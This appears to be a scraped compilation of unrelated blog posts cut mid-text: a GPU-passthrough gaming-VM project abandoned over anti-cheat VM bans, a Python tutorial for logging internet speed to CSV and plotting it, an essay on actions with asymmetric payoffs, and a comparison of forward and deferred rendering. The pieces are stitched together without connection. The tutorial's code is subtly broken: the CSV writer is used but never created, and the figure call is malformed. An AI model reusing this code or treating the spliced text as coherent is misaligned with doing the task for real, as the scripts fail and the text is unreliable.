I had to buy a few things to even get started on this project. The 256gb SSD was one - so that I didn’t have to wipe the currently working Windows install I had. Next was buying a sufficient amount of RAM for 2 gamers and a Linux server to run all at once on my PC. I got 32gb to start with, but my motherboard has another 4 slots and I planned to go to 64gb if all went well. Lastly, I wanted more CPU threads. My chipset, the LGA2011-1, once was available with a mammoth 16 thread CPU - the <a href="https://ark.intel.com/content/www/us/en/ark/products/64596/intel-xeon-processor-e5-2690-20m-cache-2-90-ghz-8-00-gt-s-intel-qpi.html">Xeon E5-2690</a>. I managed to grab one of these off Ebay for much, much less than its original price tag.</p>
<p>Another thing about my chipset is that it has 40 PCIE 3.0 lanes. This means that I can run two graphics cards at full speed plus install PCIE sound cards and still have lanes left over. Unless you go for an LGA2066 or an AMD Threadripper, you’re only looking at 20 or 16 lanes on any newer CPU which is lame. 60 euro for 40 lanes and 16 threads will certainly keep me happy!</p>
<p>In terms of the software install, I was of course going to use <a href="https://nixos.org/">NixOS</a>, which is now my go-to distribution for all things server related. Nothing beats declarative configuration management built into your OS, and this helped a lot throughout this process as I was able to go back and forth on VM configurations and not lose the working setups. If you’re reading this looking for some config examples, my entire QEMU command lines are <a href="https://github.com/m1cr0man/nix-configs/blob/a7257a8aea3ef885de0c45a006ef32c7181bac21/services/gamingvms.nix">in my nix-configs repo</a> as well as the rest of the system setup.</p>
<p>This would also be the first time I would use Windows 10 for my own system. I am on Windows 7 right now, for a number of reasons. One being my modded games install that I mentioned above, but also there’s a lot of features in Windows 10 that I just don’t like one bit. That said, Windows 7 is receiving less and less support from games and other applications so it was time to finally move on with this new setup.</p>
<h2 id="nothing-is-ever-easy">Nothing is ever easy</h2>
<p>I started off getting one VM working (the one which would be my own gaming VM in the end), and getting Windows installed and operational through my Nvidia graphics card was actually quite easy. The Arch Wiki guide on VFIO and <a href="https://www.reddit.com/r/VFIO">the subreddit</a> had all the resources I needed to get this running. Although, this success was short lived when I discovered my sound card wasn’t working.</p>
<p>A while ago I picked up a Creative X-Fi Titanium from Ebay. I play Battlefield 2142 and some other older games a lot and they use the EAX sound system and have some unique sound settings for X-Fi cards that makes the sound amazing. Naturally, I installed the Creative sound card driver when setting up the VM, which immediately caused it to freeze for 2 minutes, and thereafter play no sound at all.</p>
<p>It took me 2 weekends and a <a href="https://www.reddit.com/r/VFIO/comments/ixnmb2/problems_passing_through_sound_card_on_windows/">desperate Reddit post</a> to find a solution to this. I tried strace-ing the VM to see what syscalls were being used during the freeze, I messed around with the PCI device config on the Linux side to see what I could do. Eventually I discovered that the sound card worked just fine in a Linux VM, and it worked fine up until I installed the Creative driver, but after that it would take a full system reboot to get it working again which really tripped me up. Debugging on the Windows side proved too difficult for me as <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/wpp-software-tracing">it looked like</a> I was going to need a second Windows machine running Visual Studio to get anything done. I settled on using the Windows default sound card driver which did get me 24 bit audio but did not get me EAX. This was the sort of compromise I was hoping I wouldn’t need to make with the VM, but I was hopeful it would still pay off beyond this.</p>
<p>Once I had one VM running I cloned the Nix config and cloned the ZFS volume, and I had the second running in a matter of minutes. There were no problems running the second VM through the motherboard’s sound card. Installing Steam, Discord, a web browser and some games also went smoothly.</p>
<p>On the third weekend of this project, I was finally able to sit down and install Rainbow Six Seige for some actual gaming. I gathered my usual squad and we got so far as getting into a match.</p>
<p>Then I got kicked.</p>

It didn’t take me long to discover <a href="https://www.youtube.com/watch?v=vXkuyeYaTro">a Youtube video</a> and <a href="https://www.reddit.com/r/VFIO/comments/hsv8iz/battleye_just_ban_kvm_users_on_escape_from_tarkov/fydaa8y/">a Reddit post</a> explaining that BattlEye has explicitly blacklisted VMs from playing online games. This anti-cheat is used by Rainbow Six and many other games I was looking forward to playing, and searching around I found that most other anti cheats had a similar system in place. I was able to find instruction on bypassing these checks but it involved doing stuff like patching the kernel and editing hardware IDs for devices, which I was not keen to do. Not only would this be difficult to do and hard to maintain, the anti cheats could simply <a href="https://www.reddit.com/r/VFIO/comments/i1aqrz/regarding_the_vm_spoofing/">update their checks</a> at any time and start looking at something new, bringing me back to square one.</p>
<p>I want to believe that there is another solution here. The problem at its core is that the anti cheats cannot check for tampering on the hypervisor side, nor do they have the business case to implement such a system. I think if VM gaming is ever to become a viable option, the VFIO community or similar would need to offer up something to them which would validate their system as not being tampered with. I’m not even sure how this would work - a verifiable memory lock of sorts? Binary signing? It really depends on what they want - baring in mind that the concept of client-side anti cheat is pretty flawed anyway. Hell, I would even buy a “VM License” from BattlEye if such a thing existed just to make this setup work, and I can imagine the decision makers would be happy to provide such a thing if it meant more money for them.</p>
<p>Although BattlEye has claimed that up to 90% of VM gamers were cheating, that’s not to say that 90% of all cheaters use VMs. It’s way too cumbersome and from what I saw in my dark search into the bypass methods, most people just crack the binary on Windows or do some weird driver magic and then get on with memory modifications. It’s ridiculous that these systems are dictating how I play the games I paid for, making assumptions about my system and deciding that it will be worth the bad PR and small user base impact.</p>
<h2 id="mothballed-for-now">Mothballed, for now</h2>
<p>With no way to play modern titles in a VM reliably, without being wrongly accused as a cheater by unfeeling software and its business logic, I had to drop the project. If my brother and I were playing less high budget games maybe it would be viable, as it’s only games with these anti cheats that are actually an issue. That said, almost every game without weird anti cheat works on Wine now, which has opened the door to a new project that I am now half way through and will blog in the near future (read: Not 2 years again).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><img data-src="https://i.ibb.co/TgcDyYk/carbon-7-2.png" alt="Monitor your internet with python" title="Monitor your internet with python" src="https://i.ibb.co/TgcDyYk/carbon-7-2.png">
</p><p>
I live in Germany and Germany is known for its diversity. The people are diverse, the culture is diverse and the quality of internet connections are equally as diverse.</p><p>
Having spoken to my internet provider who insisted I had no problems with my internet connection I decided to write a program to monitor my upload and download speed.</p>
<h2 id="getting-started">Getting started</h2>

<p>
We will be using two cool packages in python namely <code>speedtest</code> and <code>matplotlib</code>. <code>speedtest</code> will provide us with the information about our internet connection and <code>matplotlib</code> will allow us to generate graphs based on this information.</p><p>
Whether youâ€™re in a <a href="https://docs.python.org/3/tutorial/venv.html">virtual environment</a> or not using one you will have to install speedtest and matplotlib.</p>
<div><div><pre><code>pip <span>install </span>matplotlib
pip <span>install </span>speedtest-cli
</code></pre></div></div><p>
We will also be using a few built in python packages <code>datetime</code> and <code>csv</code>. CSV (or comma-separated values) are a quick way of storing data. We will be using this to store the information about our internet speeds and then using matplotlib to make this information visual.</p>
<h2 id="gathering-data">Gathering data</h2><p>
Create a python file called <code>monitor.py</code></p>
<p>
and letâ€™s put the following code on the inside</p>
<div><div><pre><code><span>import</span> <span>speedtest</span>
<span>s</span> <span>=</span> <span>speedtest</span><span>.</span><span>Speedtest</span><span>()</span>
<span>while</span> <span>True</span><span>:</span>
    <span>print</span><span>(</span><span>s</span><span>.</span><span>download</span><span>(),</span> <span>s</span><span>.</span><span>upload</span><span>())</span>
</code></pre></div></div><p>
and we should be greeted by the following output before hitting <code>ctrl + C</code> to get out of this infinite loop.</p>
<div><div><pre><code>75020309.22943133 24381170.373616524
105192450.00822952 40653433.153288215
</code></pre></div></div><p>
So by creating a new instance of <code>speedtest</code> as <code>s</code> and testing the upload and download speed we are given the upload and download speed in bits per second. To convert this to megabits per second <code>(Mb/s)</code> we can do the following to include the time of the test too:</p>
<div><div><pre><code><span>import</span> <span>speedtest</span>
<span>import</span> <span>datetime</span>
<span>import</span> <span>time</span>
<span>s</span> <span>=</span> <span>speedtest</span><span>.</span><span>Speedtest</span><span>()</span>

<span>while</span> <span>True</span><span>:</span>
    <span>time_now</span> <span>=</span> <span>datetime</span><span>.</span><span>datetime</span><span>.</span><span>now</span><span>().</span><span>strftime</span><span>(</span><span>"%H:%M:%S"</span><span>)</span>
    <span>downspeed</span> <span>=</span> <span>round</span><span>((</span><span>round</span><span>(</span><span>s</span><span>.</span><span>download</span><span>())</span> <span>/</span> <span>1048576</span><span>),</span> <span>2</span><span>)</span>
    <span>upspeed</span> <span>=</span> <span>round</span><span>((</span><span>round</span><span>(</span><span>s</span><span>.</span><span>upload</span><span>())</span> <span>/</span> <span>1048576</span><span>),</span> <span>2</span><span>)</span>
    <span>print</span><span>(</span><span>f"time: </span><span>{</span><span>time_now</span><span>}</span><span>, downspeed: </span><span>{</span><span>downspeed</span><span>}</span><span> Mb/s, upspeed: </span><span>{</span><span>upspeed</span><span>}</span><span> Mb/s"</span><span>)</span>
    <span># 60 seconds sleep
</span>    <span>time</span><span>.</span><span>sleep</span><span>(</span><span>60</span><span>)</span>
</code></pre></div></div>
<p><strong>Note:</strong> Added a delay due to <a href="https://www.reddit.com/r/Python/comments/jhh8oa/monitor_your_internet_with_python/">feedback</a> received by <a href="https://www.reddit.com/user/squidwardtentickles/">an awesome Reddit user.</a></p><p>
which yields to:</p>
<div><div><pre><code><span>time</span>: 12:44:15, downspeed: 95.04 Mb/s, upspeed: 32.85 Mb/s
<span>time</span>: 12:44:35, downspeed: 99.46 Mb/s, upspeed: 38.76 Mb/s
<span>time</span>: 12:44:56, downspeed: 100.59 Mb/s, upspeed: 38.94 Mb/s
</code></pre></div></div><p>
Now we will move on to recording this in a CSV file. CSVs are large text files which values separated by commas. Here is an example of one of mine:</p>
<pre><code>time,downspeed,upspeed
12:17:01,100.05,38.28
12:17:21,100.53,37.85
12:17:42,74.87,25.92
</code></pre><p>
We start with a header row then have the information split up. We can think about this like an excel sheet:</p>
<p><a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ekJiEGPQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/upoqadpj8vh4se02u4om.png"><img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ekJiEGPQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/upoqadpj8vh4se02u4om.png" alt="a table with the same information as the code block above"></a></p><p>
In order to record into a csv file in python we need to import the CSV package and â€˜openâ€™ a CSV file (if one doesnâ€™t exist it will create one).</p>
<div><div><pre><code><span>import</span> <span>speedtest</span>
<span>import</span> <span>datetime</span>
<span>import</span> <span>csv</span>
<span>import</span> <span>time</span>

<span>s</span> <span>=</span> <span>speedtest</span><span>.</span><span>Speedtest</span><span>()</span>

<span>with</span> <span>open</span><span>(</span><span>'test.csv'</span><span>,</span> <span>mode</span><span>=</span><span>'w'</span><span>)</span> <span>as</span> <span>speedcsv</span><span>:</span>

    <span>csv_writer</span><span>.</span><span>writeheader</span><span>()</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>time_now</span> <span>=</span> <span>datetime</span><span>.</span><span>datetime</span><span>.</span><span>now</span><span>().</span><span>strftime</span><span>(</span><span>"%H:%M:%S"</span><span>)</span>
        <span>downspeed</span> <span>=</span> <span>round</span><span>((</span><span>round</span><span>(</span><span>s</span><span>.</span><span>download</span><span>())</span> <span>/</span> <span>1048576</span><span>),</span> <span>2</span><span>)</span>
        <span>upspeed</span> <span>=</span> <span>round</span><span>((</span><span>round</span><span>(</span><span>s</span><span>.</span><span>upload</span><span>())</span> <span>/</span> <span>1048576</span><span>),</span> <span>2</span><span>)</span>
        <span>csv_writer</span><span>.</span><span>writerow</span><span>({</span>
            <span>'time'</span><span>:</span> <span>time_now</span><span>,</span>
            <span>'downspeed'</span><span>:</span> <span>downspeed</span><span>,</span>
            <span>"upspeed"</span><span>:</span> <span>upspeed</span>
        <span>})</span>
        <span># 60 seconds sleep
</span>        <span>time</span><span>.</span><span>sleep</span><span>(</span><span>60</span><span>)</span>
</code></pre></div></div><p>
So while you let this code run for 4-5 minutes we can discuss what is going on. Line 7 <code>with open</code> essentiallly creates a csv file with the name <code>test.csv</code> with the headers <code>name</code>, <code>downspeed</code> and <code>upspeed</code> and writes them into the csv. Then the loop begins and every time a test is performed by speedtest it writes a new row into the csv with the time, download speed and upload speed we specified before. So letâ€™s go and look at that now.</p>
<pre><code>time,downspeed,upspeed
12:51:16,99.29,38.66
12:51:37,100.67,38.79
12:51:57,99.7,38.79
12:52:17,92.89,31.99
12:52:38,99.4,38.96
</code></pre><p>
Cool now we are gathering information and storing it in a csv. You could do all sorts of clever stuff with the filename like name it todayâ€™s date using <code>datetime</code> but for now I will keep it as test.</p><p>
You could also set up a check to see if a certain amount of time has passed and to stop the application after that but I will leave that up to your own creativity.</p>
<h2 id="visualising-the-data">Visualising the data</h2><p>
Letâ€™s make another python file to generate the graph of our internet connection. This is where we will use matplotlib.</p>

<div><div><pre><code><span>import</span> <span>matplotlib.pyplot</span> <span>as</span> <span>plt</span>
<span>import</span> <span>csv</span>
<span>import</span> <span>matplotlib.ticker</span> <span>as</span> <span>ticker</span>
<span>times</span> <span>=</span> <span>[]</span>
<span>download</span> <span>=</span> <span>[]</span>
<span>upload</span> <span>=</span> <span>[]</span>
</code></pre></div></div><p>
The easiest way to generate a graph is by using an array. In order to populate our arrays we will have to iterate through our new csv file</p>
<div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>'test.csv'</span><span>,</span> <span>'r'</span><span>)</span> <span>as</span> <span>csvfile</span><span>:</span>
    <span>plots</span> <span>=</span> <span>csv</span><span>.</span><span>reader</span><span>(</span><span>csvfile</span><span>,</span> <span>delimiter</span><span>=</span><span>','</span><span>)</span>
    <span>next</span><span>(</span><span>csvfile</span><span>)</span>
    <span>for</span> <span>row</span> <span>in</span> <span>plots</span><span>:</span>
        <span>times</span><span>.</span><span>append</span><span>(</span><span>str</span><span>(</span><span>row</span><span>[</span><span>0</span><span>]))</span>
        <span>download</span><span>.</span><span>append</span><span>(</span><span>float</span><span>(</span><span>row</span><span>[</span><span>1</span><span>]))</span>
        <span>upload</span><span>.</span><span>append</span><span>(</span><span>float</span><span>(</span><span>row</span><span>[</span><span>2</span><span>]))</span>

<span>print</span><span>(</span><span>times</span><span>,</span> <span>"</span><span>\n</span><span>"</span><span>,</span> <span>download</span><span>,</span> <span>"</span><span>\n</span><span>"</span><span>,</span> <span>upload</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code><span>[</span><span>'12:51:16'</span>, <span>'12:51:37'</span>, <span>'12:51:57'</span>, <span>'12:52:17'</span>, <span>'12:52:38'</span><span>]</span>
    <span>[</span>99.29, 100.67, 99.7, 92.89, 99.4]
    <span>[</span>38.66, 38.79, 38.79, 31.99, 38.96]
</code></pre></div></div><p>
So now we are parsing our data! The <code>next(csvfile)</code> essentially skips the row of headers (that were for our benefit only, not pythonâ€™s). Now we come on to using <code>matplotlib</code> which I am by no standards an expert on. <a href="https://matplotlib.org/">Their documentation</a> is <em>extensive</em>.</p>
<div><div><pre><code><span>plt</span><span>.</span><span>figure</span><span>(</span><span>30</span><span>,</span> <span>30</span><span>)</span>
<span>plt</span><span>.</span><span>plot</span><span>(</span><span>times</span><span>,</span> <span>download</span><span>,</span> <span>label</span><span>=</span><span>'download'</span><span>,</span> <span>color</span><span>=</span><span>'r'</span><span>)</span>
<span>plt</span><span>.</span><span>plot</span><span>(</span><span>times</span><span>,</span> <span>upload</span><span>,</span> <span>label</span><span>=</span><span>'upload'</span><span>,</span> <span>color</span><span>=</span><span>'b'</span><span>)</span>
<span>plt</span><span>.</span><span>xlabel</span><span>(</span><span>'time'</span><span>)</span>
<span>plt</span><span>.</span><span>ylabel</span><span>(</span><span>'speed in Mb/s'</span><span>)</span>
<span>plt</span><span>.</span><span>title</span><span>(</span><span>"internet speed"</span><span>)</span>
<span>plt</span><span>.</span><span>legend</span><span>()</span>
<span>plt</span><span>.</span><span>savefig</span><span>(</span><span>'test_graph.jpg'</span><span>,</span> <span>bbox_inches</span><span>=</span><span>'tight'</span><span>)</span>
</code></pre></div></div><p>
This code tells matplotlib or <code>plt</code> object to create a figure with the lines labelled â€˜downloadâ€™ and â€˜uploadâ€™ to be plotted against their respective arrays. So for every item in the download and time array, a mark will be made on the graph against it. Finally the x and y-axis get labels and the graph gets saved.</p>

This is a short form of a project I recently finished which contains automated uploads to a cloud platform, schedules itself daily does some annotations of the lowest download speed. I initially made it to complain to my internet provider however I know that it will be like showing a graph to a brick wall.</p>

<p>Something has an <strong>asymmetric payoff</strong> if you stand to gain a lot more than you stand to lose. Stock options, for example, have an asymmetric payoff curve.</p>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBMQT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--f24232febb5dbe4fbead2fcfa0470cc71442f093/image-1601846340990.gif" alt="file"></p>

<p>Payoff chart for a long call option</p>

<p>In the chart above, the dotted blue line represents the payoff for a stock. It's linear because a $1 increase in share price means a $1 increase for the stockholder, and a $1 decrease in share price means a $1 decrease for the stockholder.</p>

<p>But the red line—representing the payoff function for a call option on this stock—is <em>not</em> linear. Above $100 (the strike price) the payoff function mirrors that of the underlying stock, but <em>below</em> $100 there's no more loss.</p>

<p>In other words: <strong>you get all the upside but none of the downside.</strong></p>

<p>Unfortunately the market for options is pretty efficient, which means this positive convexity is priced into the option premium. But real-life actions <em>also</em> have payoff curves, and ideally these would also have positive, asymmetric payoffs.</p>

<p>Real-life actions tend to be less-efficiently priced, because</p>

<ul>
<li>Nobody knows your circumstances better than you do</li>
<li>Humans have all sorts of quirks and biases</li>
<li>Personal decisions are <em>rarely</em> zero sum, but financial markets <em>are</em>
</li>
</ul>

<p>I've compiled a non-exhaustive list of actions with (positive) convex payoffs below. <a href="mailto:tjcx@tjcx.me">Let me know</a> if I missed any!</p>

<h2>Interpersonal</h2>

<h3>Giving gifts</h3>

<p>Twice in <em>Shoe Dog</em>, Phil Knight sends unsolicited gifts to people's homes. First, he sends legendary track coach Bill Bowerman a pair of Tiger shoes, which ultimately induces Bowerman to join (what will become) Nike, providing Knight with a powerful business partner.</p>

<p>Then, after visiting his supplier in Japan, he sends a money order to one of the supplier's employees "for a new bike" to replace the one he lost in WWII. Later, this employee provides Knight with valuable inside information about his employer.</p>

<p>The point is that giving a gift has a small fixed cost (like an option) but the possibility of providing very large returns.</p>

<h3>Asking for big things</h3>

<p>Asking for stuff has a limited cost (getting rejected) but unlimited gain (getting anything you ask for). The bigger the ask, the better your expected value! Try asking for</p>

<h4>Promotions</h4>

<p>The downside of asking for promotions is that you annoy your boss. The possible upsides are</p>

<ol>
<li>You get it immediately</li>
<li>You plant the idea in your boss's head</li>
<li>You make it seem reasonable that you should be promoted soon</li>
<li>You learn what needs to happen in order to get promoted</li>
</ol>

<p>So just ask.</p>

<h4>Raises</h4>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBMUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--b2e3e11a7a1acbc649014515a168e5e2305debf9/image-1601846423636.gif" alt="Raise"></p>

<p>See above. As with investing/interest, small percentage increases in your salary will compound over time, so ask for raises often. (Or <a href="#switching-companies">switch companies</a> to get one.)</p>

<h4>Investments (in your business)</h4>

<p>There's currently a dearth of good startups and a deluge of investor money, so you'd probably be surprised how many people would be willing to invest in your new venture.</p>

<p>But even in less favorable conditions it can never hurt to ask. People with lots of money are always looking for</p>

<ol>
<li>Good returns</li>
<li>Something interesting to do</li>
<li>Insider status</li>
</ol>

<p>All of which make them eager to invest. And receiving investment can have huge returns, allowing you to scale your business.</p>

<h4>More business (from customers)</h4>

<p>Okay sure, asking a prospect "Hey there want to buy my product?" isn't exactly a nuanced approach to sales. But "asking" in this context could also mean running ads, telling friends, cold emailing people, etc. The upsides here are</p>

<ol>
<li>You get more customers</li>
<li>You learn why nobody wants to buy your thing</li>
</ol>

<p>Both of which are immensely valuable. Whereas the "asking" part has virtually zero downside.</p>

<h4>Sabbaticals</h4>

<p>Obviously it depends on where you work, but in some industries and role the "sabbatical" (i.e. long vacation) is relatively common. It's expensive to hire your replacement, so if you're burnt out or considering switching companies, tell your employer you need a break. The worst that happens is they say "no"! And the best case scenario is you get to take a massive paid vacation.</p>

<h4>Partnerships (with other people/businesses)</h4>

<p>Alright I know I used this example from <em>Shoe Dog</em> already, but Phil Knight partnering with Bill Bowerman was the decision that created Nike. And it happened because Bowerman made the (zero-risk) decision to simply <em>ask</em> Phil Knight if he could join Blue Ribbon. He ended up owning 49% of the company that would become Nike, and (if <em>Shoe Dog</em> is to be believed) got to just hang out at his house and mess around with waffle irons.</p>

<h3>Meeting people</h3>

<p>Meeting new people can be uncomfortable, but that's pretty much the only downside. The upside, however, is virtually limitless: you could meet your future life partner, your future business partner, your best friend, your key investor, your biggest client, etc. Sow lots of seeds, and some of them will become sequoias.</p>

<h4>Go to meetups</h4>

<p>It's easier to talk to strangers when you all have <em>something</em> to talk about—and what are meetups but groups of people getting together to talk about <strong>one</strong> thing? Go to a variety of meetups, both to maximize your chances of meeting people but also to <a href="#learning">learn</a> more stuff!</p>

<h4>Join a sports team</h4>

<p>Sports seem to breed camaraderie, so joining a sports team can be the fastest way to pick up some new friends. Plus it counts as <a href="#exercise">exercise experimentation</a>, so that's two birds with one stone.</p>

<h4>Volunteer</h4>

<p>Putting a bunch of people in a room and saying "okay go be friends now" generally doesn't work—you need some kind of activity to bond over. And volunteering is a <em>great</em> bonding activity. You've more-or-less filtered out all the assholes (who generally don't volunteer) and volunteers are generally in an open, friend-making mood. Plus you end up learning about something (political campaigns, homeless programs, environmental cleanup) that you probably had no prior experience with (see <a href="#learning">learning</a>).</p>

<h3>Organize something</h3>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBMZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--6a1b64312afd28c3a881b201237f50203c3a0087/image-1601846549934.jpg" alt="Benjamin Franklin"></p>

<p>Benjamin Franklin organized the first American fire department, the first American library, and the first American philosophical society. He was an organizing machine, and it propelled him to great heights. If you find yourself saying "wouldn't if be nice if there was..." just <em>organize</em> it!</p>

<h2>Creative</h2>

<h3>Writing a blog post</h3>

<p>Yeah okay it's a bit on the nose but blog post-writing has some very asymmetric payoffs. The cost of writing one is fixed and relatively small, but the impact can sometimes be <em>huge</em>. My post on <a href="https://tjcx.me/posts/i-wasted-40k-on-a-fantastic-startup-idea/">losing \$40K</a> still gets thousands of hits a day, and it took a few hours to write. Sure, many of your posts will be read by zero people, but occasionally <em>thousands</em> of people will read one, which could lead to <a href="#meeting-people">meeting new people</a>, new business, or exposure to <a href="#learning">new ideas</a>.</p>

<h3>Tweeting</h3>

<p>This has the same benefits of writing a blog post, but with far less overhead (and arguably the same payoff profile). I'm just not very good at limiting myself to 280 characters.</p>

<h3>Creating a product</h3>

<p>Creating a product can also have outsize returns. It's not always worthwhile (the initial investment could be quite high) but launching the right product or business could change your life.</p>

<h2>Learning</h2>

<p>The only downside to learning new things is the <em>time</em> you spend doing it—but the upside is enormous.</p>

<h3>Reading (the right) books</h3>

<p>We can read faster than we can listen (to podcasts) or watch (videos)—so if <em>learning</em> is a convex activity, then reading books will provide the best bang for your buck. And <em>within</em> the book category there are two subcategories that will get you even better payoffs.</p>

<h4>Very old books</h4>

<p>Old books are good because</p>

<ol>
<li>They're <a href="https://en.wikipedia.org/wiki/Lindy_effect"><strong>Lindy</strong></a>: a book that has survived centuries must have some good (or at least thought-provoking) ideas</li>
<li>They're <strong>unpopular</strong>: old books are rarely on bestseller lists, which means the information they provide will be more likely to give you a novel idea (pun intended).</li>
</ol>

<h4>Very specialized books</h4>

<p>Specialized books are good because</p>

<ol>
<li>Deep knowledge in a certain area tends to produce innovations</li>
<li>Again, they're <strong>unpopular</strong>: you'll likely stumble across something that few others have</li>
</ol>

<h3>Experimenting</h3>

<p>Experimentation usually involves ratcheting: we can ignore bad results but build on good results. This means that the downside is low (almost zero) but the upside (if you discover something immensely important) is huge.</p>

<p>Below are some examples of things we can <em>all</em> experiment with, but keep an eye out for other opportunities to run experiments.</p>

<h4>Diet</h4>

<p>Having a good diet makes you more confident, more energetic, and generally better at taking on the world. There is a <em>lot</em> of conflicting diet advice out there, but the costs of self-experimentation are pretty low—so just try some stuff!</p>

<p>In the worst case you'll get a stomach ache, but in the best case you'll dramatically improve your health!</p>

<h4>Exercise</h4>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBMdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ccd9c25d7a82d94c8b6a749d0589aa36fc4e112f/image-1601846572078.gif" alt="Corgi exercise"></p>

<p>This is pretty similar to the above section: experimenting with different forms of exercise isn't hard—but the benefits of finding a type of exercise that works for your body, your schedule, and your preferences can considerably improve your life.</p>

<h4>Routine</h4>

<p>We are our habits. Life isn't about one or two momentous decisions, it's about the little things we do consistently, every day. A corollary is that <em>modifying</em> these habits can lead to massive long-term changes in our lives.</p>

<p>You could argue that the payoff function for habits is in fact <em>symmetric</em>: developing bad habits is bad in the same way that developing good habits is good. But—like a lot of things in this list—careful experimentation can limit the downside (you can stop if things start looking bad) but keep the massive upside. So beware of developing bad habits!</p>

<h3>Switching jobs</h3>

<p>I don't think I've ever talked to somone who <em>regretted</em> switching jobs. Randall Munroe agrees:</p>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBNQT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--0f45e45b35e6001130b1d97c4e280f4c34f2bf97/image-1601846613653.png" alt="XKCD comic: Settling"></p>



<h4>Switching roles</h4>

<p>Switching roles (i.e. careers) is usually easier if you do it at your current company, and the downsides are often smaller than people think. Generally speaking, companies will let you transition <em>back</em> to your old role, or transition again to another role.</p>

<p>Transitioning roles give you upside in the form of</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1320">
                                                
                  <section>
              <p>So… this is a highly discussed topic these days. Many engines already do Deferred Shading. Doom 2016 decided to go Forward at 60 FPS with 1080p, thus making popular that&nbsp;big AAA titles with high demands can do Forward just fine (although it’s not the first nor only AAA title that uses Forward. Forza Horizon 2 for example). VR also tends to like forward because of the lower bandwidth costs at high resolution +&nbsp;MSAA.</p>
<p>However, I feel there’s a lot not being covered in regular discussions. Having implemented both, I want to describe the strengths and weaknesses of each other.</p>
<p><strong>Note:</strong>&nbsp;When I say “Forward” in this post, I’m referring to any of the modern variations that allow efficiently rendering lots of lights in forward shading&nbsp;methods: Tiled Forward, Clustered Forward, Forward+, Forward+ 2.5, Forward3D. They’re all variations of the same thing. I will not be referring to “Forward” as the old technique&nbsp;of keeping a per-draw fixed-length array of lights that was common in the 90’s and 2000’s, most commonly but not always limited to 8 lights per draw.</p>

<h3>What everyone tells you about Forward vs Deferred:</h3>
<h4>Pros of Forward:</h4>
<ol>
<li>Works with MSAA</li>
<li>Works with transparency</li>
<li>Allows using multiple BRDFs</li>
</ol>
<h4>Cons of Forward:</h4>
<ol>
<li>Often requires a Z pre-pass (not always, depends on implementation and trade offs)</li>
<li>Pixel quad occupancy problems for tiny triangles</li>
<li>Performance more dependent on complexity of scene</li>
<li>The “good” modern algorithms require compute shaders, which can be a problem if DX10-level hardware is being targeted.</li>
</ol>
<h4>Pros of Deferred:</h4>
<ol>
<li>Performance&nbsp;depends more on screen resolution than scene complexity.</li>
<li>Lots of resources online on how to implement one.</li>
<li>Works on really old hardware, including mobile.</li>
<li>Impact of tiny triangles is lower.</li>
<li>Mobile extensions can optimize bandwidth consumption a lot by keeping passes in on-chip memory.</li>
</ol>
<h4>Const of Deferred:</h4>
<ol>
<li>Antialising is <em>hard</em>.</li>
<li>Transparency is really hard. Better revert to using Forward for those.</li>
<li>Poor support for multiple BRDFs.</li>
<li>Consumes A LOT of bandwidth. (though there are <a href="https://forum.beyond3d.com/threads/modern-textureless-deferred-rendering-techniques.57611/">modern variations that reduce&nbsp;bandwidth consumption</a>, but they only work on modern&nbsp;GPUs)</li>
<li>You’re lucky if you get those mobile extensions for using on-chip memory to work in shipped devices other than your own. Yes, Vulkan supports subpasses&nbsp;as a core feature, but again… you’re lucky if you find many Android devices supporting Vulkan. The market share right now is minuscule. There’s still GLES2-only Android devices being manufactured in 2016!</li>
</ol>
<p>Both Deferred and Forward have the motto that “one big light == many small lights” due to fillrate/computation behavior.</p>

<h3>What is rarely talked about</h3>
<p>This is where I wanted to get to. If we look at the pros and cons I just listed, which are listed everywhere, modern Forward has huge pluses. As in, huuuge pluses. MSAA + transparency + multiple BRDFs + low bandwidth??? Count me in!!!</p>
<p>So… what’s that catch?</p>

<h4>One huge mega-shader</h4>
<p>The first problem that pops up is that everything gets mashed up into one big pixel shader. The same pixel shader has to do:</p>
<ol>
<li>Directional’s shadow mapping (often selecting splits or doing fancy things to get pretty looking shadows).</li>
<li>Shadow mapping for any other light (spot and/or point)</li>
<li>Normal mapping (TBN matrix operations)</li>
<li>Sampling all textures (albedo, specular/metalness, roughness)</li>
<li>Detail map compositing (if more than one diffuse texture is used)</li>
<li>Iterate through the cluster for point lights.</li>
<li>Iterate through the cluster for&nbsp;spot lights.</li>
</ol>
<p>This results in horrible VGPR/SGPR register usage, which results in horrible occupancy and thus hinder the ability of the GPU to hide latency of memory reads and other stalls. Deferred shading has the advantage of being able to do more passes in smaller shaders that do one operation each (at the expense of more bw consumption for each pass).</p>
<p>Deferred gives us better control on the ratio&nbsp;of shader_passes / shader_size aka how many operations we&nbsp;cram into the same shader before writing a new one.</p>

<h4>Dependency problems</h4>
<p>The first thing that comes to mind is SSAO. Ideally SSAO needs to be applied to <em>only</em> the ambient lighting term. The thing is, to compute SSAO you need access to the depth buffer. But you don’t have the depth buffer until you’ve done your forward pass. So you’re in a Catch-22 problem:</p>
<ul>
